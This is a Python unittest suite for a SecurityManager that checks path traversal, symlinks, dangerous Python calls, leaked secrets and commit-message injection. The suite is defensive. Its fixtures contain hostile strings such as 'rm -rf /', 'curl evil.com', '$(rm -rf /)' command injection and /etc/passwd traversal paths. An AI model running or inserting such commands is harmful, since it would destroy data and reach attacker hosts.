#!/usr/bin/env python3
"""
Comprehensive test suite for SecurityManager

Tests all security validation functionality including:
- Path sanitization and validation
- Symlink detection
- AST-based Python analysis
- Content validation
- Git directory security
- Commit message sanitization

This test suite runs during development to ensure security protections work correctly.
"""

import os
import shutil
import tempfile
import unittest

from security_manager import (
    RiskLevel,
    SecurityManager,
    SecurityReport,
    ViolationType,
)


class TestSecurityManager(unittest.TestCase):
    """Test cases for SecurityManager"""

    def setUp(self):
        """Set up test environment"""
        self.security_manager = SecurityManager()
        self.test_dir = tempfile.mkdtemp()
        self.project_root = os.path.join(self.test_dir, "test_project")
        os.makedirs(self.project_root, exist_ok=True)

    def tearDown(self):
        """Clean up test environment"""
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)

    def test_validate_project_path_valid(self):
        """Test validation of valid project paths"""
        # Valid existing directory
        self.assertTrue(self.security_manager.validate_project_path(self.project_root))

        # Valid relative path
        os.chdir(self.test_dir)
        self.assertTrue(self.security_manager.validate_project_path("test_project"))

    def test_validate_project_path_invalid(self):
        """Test validation rejects invalid paths"""
        # Non-existent path
        self.assertFalse(
            self.security_manager.validate_project_path("/nonexistent/path")
        )

        # Path traversal attempts
        self.assertFalse(self.security_manager.validate_project_path("../etc/passwd"))
        self.assertFalse(self.security_manager.validate_project_path("/etc/passwd"))

        # File instead of directory
        test_file = os.path.join(self.project_root, "test.txt")
        with open(test_file, 'w') as f:
            f.write("test")
        self.assertFalse(self.security_manager.validate_project_path(test_file))

    def test_sanitize_file_path_valid(self):
        """Test file path sanitization for valid paths"""
        test_file = os.path.join(self.project_root, "test.py")
        with open(test_file, 'w') as f:
            f.write("# test file")

        sanitized = self.security_manager.sanitize_file_path(
            test_file, self.project_root
        )
        self.assertIsNotNone(sanitized)
        self.assertTrue(sanitized.startswith(os.path.abspath(self.project_root)))

    def test_sanitize_file_path_invalid(self):
        """Test file path sanitization rejects invalid paths"""
        # Path outside project root
        outside_file = "/etc/passwd"
        sanitized = self.security_manager.sanitize_file_path(
            outside_file, self.project_root
        )
        self.assertIsNone(sanitized)

        # Path traversal attempt
        traversal_path = os.path.join(self.project_root, "../../../etc/passwd")
        sanitized = self.security_manager.sanitize_file_path(
            traversal_path, self.project_root
        )
        self.assertIsNone(sanitized)

    def test_detect_symlink_risks_safe(self):
        """Test symlink detection for safe symlinks"""
        # Create a safe symlink within project
        target_file = os.path.join(self.project_root, "target.txt")
        symlink_file = os.path.join(self.project_root, "link.txt")

        with open(target_file, 'w') as f:
            f.write("safe content")

        os.symlink(target_file, symlink_file)

        violation = self.security_manager.detect_symlink_risks(
            symlink_file, self.project_root
        )
        self.assertIsNone(violation)

    def test_detect_symlink_risks_dangerous(self):
        """Test symlink detection for dangerous symlinks"""
        # Create a symlink pointing outside project
        symlink_file = os.path.join(self.project_root, "dangerous_link.txt")

        try:
            os.symlink("/etc/passwd", symlink_file)

            violation = self.security_manager.detect_symlink_risks(
                symlink_file, self.project_root
            )
            self.assertIsNotNone(violation)
            self.assertEqual(violation.violation_type, ViolationType.SYMLINK)
            self.assertEqual(violation.risk_level, RiskLevel.HIGH)
        except OSError:
            # Skip test if we can't create symlinks (Windows, permissions, etc.)
            self.skipTest("Cannot create symlinks in test environment")

    def test_validate_file_content_safe(self):
        """Test content validation for safe files"""
        safe_content = """
# Safe Python file
def hello_world():
    print("Hello, World!")
    return "safe"
"""

        violations = self.security_manager.validate_file_content(
            "test.py", safe_content
        )
        # Should have no violations or only low-risk import violations
        critical_violations = [
            v for v in violations if v.risk_level == RiskLevel.CRITICAL
        ]
        self.assertEqual(len(critical_violations), 0)

    def test_validate_file_content_dangerous(self):
        """Test content validation detects dangerous content"""
        dangerous_content = """
import os
os.system("rm -rf /")
exec("malicious code")
"""

        violations = self.security_manager.validate_file_content(
            "malicious.py", dangerous_content
        )
        self.assertGreater(len(violations), 0)

        # Should detect dangerous patterns
        violation_types = [v.violation_type for v in violations]
        self.assertIn(ViolationType.EXECUTABLE, violation_types)

    def test_validate_file_content_sensitive(self):
        """Test content validation detects sensitive information"""
        sensitive_content = """
password = "secret123"
api_key = "sk-1234567890abcdef"
SECRET_TOKEN = "very_secret"
"""

        violations = self.security_manager.validate_file_content(
            "config.py", sensitive_content
        )
        self.assertGreater(len(violations), 0)

        # Should detect sensitive patterns
        violation_types = [v.violation_type for v in violations]
        self.assertIn(ViolationType.SENSITIVE, violation_types)

    def test_validate_file_content_binary(self):
        """Test content validation handles binary files"""
        binary_content = "Binary file content\x00\x01\x02"

        violations = self.security_manager.validate_file_content(
            "binary.exe", binary_content
        )
        self.assertGreater(len(violations), 0)

        # Should detect null bytes
        self.assertTrue(any("null bytes" in v.description for v in violations))

    def test_analyze_python_ast_safe(self):
        """Test AST analysis for safe Python code"""
        safe_code = """
def calculate_sum(a, b):
    return a + b

result = calculate_sum(1, 2)
print(f"Result: {result}")
"""

        violations = self.security_manager.analyze_python_ast("safe.py", safe_code)
        # Should have no critical violations
        critical_violations = [
            v for v in violations if v.risk_level == RiskLevel.CRITICAL
        ]
        self.assertEqual(len(critical_violations), 0)

    def test_analyze_python_ast_dangerous(self):
        """Test AST analysis detects dangerous Python code"""
        dangerous_code = """
import os
import subprocess

# Dangerous function calls
os.system("rm -rf /")
subprocess.run("curl evil.com", shell=True)
exec("malicious_code")
eval("dangerous_eval")
"""

        violations = self.security_manager.analyze_python_ast(
            "dangerous.py", dangerous_code
        )
        self.assertGreater(len(violations), 0)

        # Should detect multiple dangerous patterns
        high_risk_violations = [
            v
            for v in violations
            if v.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
        ]
        self.assertGreater(len(high_risk_violations), 0)

    def test_analyze_python_ast_syntax_error(self):
        """Test AST analysis handles syntax errors"""
        invalid_code = """
def broken_function(
    # Missing closing parenthesis and colon
    print("This is invalid Python"
"""

        violations = self.security_manager.analyze_python_ast("broken.py", invalid_code)
        self.assertGreater(len(violations), 0)

        # Should detect syntax error as potential obfuscation
        self.assertTrue(
            any(v.violation_type == ViolationType.OBFUSCATED for v in violations)
        )

    def test_validate_git_directory_safe(self):
        """Test git directory validation for safe repositories"""
        git_dir = os.path.join(self.project_root, ".git")
        os.makedirs(git_dir, exist_ok=True)

        # Create safe git files
        commit_msg_file = os.path.join(git_dir, "COMMIT_EDITMSG")
        with open(commit_msg_file, 'w') as f:
            f.write("Safe commit message")

        violations = self.security_manager.validate_git_directory(git_dir)
        # Should have no violations for safe content
        critical_violations = [
            v for v in violations if v.risk_level == RiskLevel.CRITICAL
        ]
        self.assertEqual(len(critical_violations), 0)

    def test_validate_git_directory_risky(self):
        """Test git directory validation detects risky content"""
        git_dir = os.path.join(self.project_root, ".git")
        os.makedirs(git_dir, exist_ok=True)

        # Create risky git files
        commit_msg_file = os.path.join(git_dir, "COMMIT_EDITMSG")
        with open(commit_msg_file, 'w') as f:
            f.write("Commit with $(rm -rf /) injection")

        violations = self.security_manager.validate_git_directory(git_dir)
        self.assertGreater(len(violations), 0)

        # Should detect git injection
        self.assertTrue(
            any(v.violation_type == ViolationType.GIT_EXPLOIT for v in violations)
        )

    def test_sanitize_commit_message_safe(self):
        """Test commit message sanitization for safe messages"""
        safe_messages = [
            "Fix bug in user authentication",
            "Add new feature for data processing",
            "Update documentation",
            "",
        ]

        for message in safe_messages:
            sanitized = self.security_manager.sanitize_commit_message(message)
            self.assertEqual(sanitized, message.strip())

    def test_sanitize_commit_message_dangerous(self):
        """Test commit message sanitization removes dangerous content"""
        dangerous_messages = [
            "Fix bug $(rm -rf /)",
            "Add feature `curl evil.com`",
            "Update ${HOME}/.bashrc",
            "Test with ; rm -rf /",
            "Message with\x00null bytes",
        ]

        for message in dangerous_messages:
            sanitized = self.security_manager.sanitize_commit_message(message)

            # Should not contain dangerous patterns or should be sanitized
            if "$(rm -rf /)" in message:
                self.assertIn("$(SANITIZED)", sanitized)
            if "`curl evil.com`" in message:
                self.assertIn('"curl evil.com"', sanitized)
            if "${HOME}" in message:
                self.assertIn("${SANITIZED}", sanitized)

            # These should be completely removed
            self.assertNotIn(";", sanitized)
            self.assertNotIn("\x00", sanitized)

    def test_sanitize_commit_message_length_limit(self):
        """Test commit message length limiting"""
        long_message = "A" * 600  # Longer than 500 char limit

        sanitized = self.security_manager.sanitize_commit_message(long_message)
        self.assertLessEqual(len(sanitized), 500)
        self.assertTrue(sanitized.endswith("..."))

    def test_scan_for_security_risks_comprehensive(self):
        """Test comprehensive security scanning"""
        # Create test files with various risk levels
        test_files = []

        # Safe file
        safe_file = os.path.join(self.project_root, "safe.py")
        with open(safe_file, 'w') as f:
            f.write("print('Hello, World!')")
        test_files.append(safe_file)

        # Sensitive file
        sensitive_file = os.path.join(self.project_root, "config.py")
        with open(sensitive_file, 'w') as f:
            f.write("password = 'secret123'")
        test_files.append(sensitive_file)

        # Executable file
        exe_file = os.path.join(self.project_root, "malware.exe")
        with open(exe_file, 'wb') as f:
            f.write(b"Binary executable content\x00\x01")
        test_files.append(exe_file)

        # Perform security scan
        report = self.security_manager.scan_for_security_risks(
            test_files, self.project_root
        )

        # Verify report structure
        self.assertIsInstance(report, SecurityReport)
        self.assertGreaterEqual(report.total_excluded, 1)  # At least the .exe file

        # Should have detected the executable
        self.assertIn(exe_file, report.executables)

    def test_generate_security_summary(self):
        """Test security summary generation"""
        # Create a report with various violations
        report = SecurityReport(
            symlinks=["/path/to/symlink"],
            executables=["/path/to/exe"],
            sensitive_files=["/path/to/config"],
            git_risks=[],
            total_excluded=3,
            violations=[],
        )

        summary = self.security_manager.generate_security_summary(report)

        # Should contain exclusion information
        self.assertIn("Excluded 3 risky files", summary)
        self.assertIn("symlinks", summary)
        self.assertIn("executables", summary)
        self.assertIn("sensitive", summary)

    def test_generate_security_summary_clean(self):
        """Test security summary for clean scan"""
        clean_report = SecurityReport(
            symlinks=[],
            executables=[],
            sensitive_files=[],
            git_risks=[],
            total_excluded=0,
            violations=[],
        )

        summary = self.security_manager.generate_security_summary(clean_report)
        self.assertIn("No risks detected", summary)
        self.assertIn("✅", summary)

    def test_is_safe_to_scan(self):
        """Test quick safety check for files"""
        # Create test files
        safe_file = os.path.join(self.project_root, "safe.py")
        with open(safe_file, 'w') as f:
            f.write("print('safe')")

        exe_file = os.path.join(self.project_root, "unsafe.exe")
        with open(exe_file, 'w') as f:
            f.write("executable")

        # Test safety checks
        self.assertTrue(
            self.security_manager.is_safe_to_scan(safe_file, self.project_root)
        )
        self.assertFalse(
            self.security_manager.is_safe_to_scan(exe_file, self.project_root)
        )
        self.assertFalse(
            self.security_manager.is_safe_to_scan("/etc/passwd", self.project_root)
        )


class TestSecurityManagerIntegration(unittest.TestCase):
    """Integration tests for SecurityManager with real-world scenarios"""

    def setUp(self):
        """Set up integration test environment"""
        self.security_manager = SecurityManager()
        self.test_dir = tempfile.mkdtemp()
        self.project_root = os.path.join(self.test_dir, "real_project")
        os.makedirs(self.project_root, exist_ok=True)

    def tearDown(self):
        """Clean up integration test environment"""
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)

    def test_real_world_python_project(self):
        """Test scanning a realistic Python project structure"""
        # Create realistic project structure
        project_files = {
            "main.py": "#!/usr/bin/env python3\nprint('Hello World')",
            "config.py": "DATABASE_URL = 'sqlite:///app.db'",
            "requirements.txt": "flask==2.0.1\nrequests==2.25.1",
            ".env": "SECRET_KEY=very_secret_key_here",
            "tests/test_main.py": "import unittest\nclass TestMain(unittest.TestCase): pass",
            ".git/config": "[core]\nrepositoryformatversion = 0",
            ".git/COMMIT_EDITMSG": "Add new feature",
            "node_modules/package/index.js": "module.exports = {}",
            "venv/lib/python3.9/site-packages/package.py": "# Virtual env file",
        }

        # Create files
        for file_path, content in project_files.items():
            full_path = os.path.join(self.project_root, file_path)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, 'w') as f:
                f.write(content)

        # Scan all files
        all_files = []
        for root, dirs, files in os.walk(self.project_root):
            for file in files:
                all_files.append(os.path.join(root, file))

        report = self.security_manager.scan_for_security_risks(
            all_files, self.project_root
        )

        # Should detect .env as sensitive
        self.assertGreater(len(report.sensitive_files), 0)

        # Should have some exclusions
        self.assertGreater(report.total_excluded, 0)

        # Generate summary
        summary = self.security_manager.generate_security_summary(report)
        self.assertIsInstance(summary, str)
        self.assertGreater(len(summary), 0)


def run_security_tests():
    """Run all security tests and return results"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add test cases
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityManager))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityManagerIntegration))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result.wasSuccessful()


if __name__ == "__main__":
    print("Running SecurityManager test suite...")
    print("=" * 60)

    success = run_security_tests()

    print("=" * 60)
    if success:
        print("✅ All security tests passed!")
    else:
        print("❌ Some security tests failed!")

    exit(0 if success else 1)
